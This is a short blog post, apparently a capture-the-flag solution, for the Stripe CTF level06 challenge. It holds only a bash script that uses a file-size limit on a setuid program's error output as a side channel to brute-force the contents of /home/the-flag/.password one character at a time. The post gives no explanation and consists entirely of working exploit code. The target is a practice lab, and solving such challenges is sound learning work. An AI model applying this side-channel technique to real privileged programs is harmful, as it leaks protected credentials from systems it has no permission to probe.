---
layout: post
title: "level06 stripe ctf"
date: 2012-02-29 10:05:46
tags: ["ctf"]
---

```bash
#!/usr/bin/env bash

ulimit -f 1 # set file size limit to 1024 bytes

s=""
while true; do 
  for ((i=32; i < 127; i++)); do
    rm f o
    c=$(ruby -e "print ${i}.chr")
    t="${s}${c}..."
    echo "${t}"

    ruby -e "print 'A' * (1024-33-${#t}+3)" > f;
    /levels/level06 /home/the-flag/.password "${t}" 2>>f 1>o;

    sleep 0.1 # INCREASE LIBERALLY IF FALSE POSITIVES
   
    if [ ! -s o ]; then # if file o is empty
      s="${s}${c}"
      echo -n $c
      break
    fi
  done
done
```
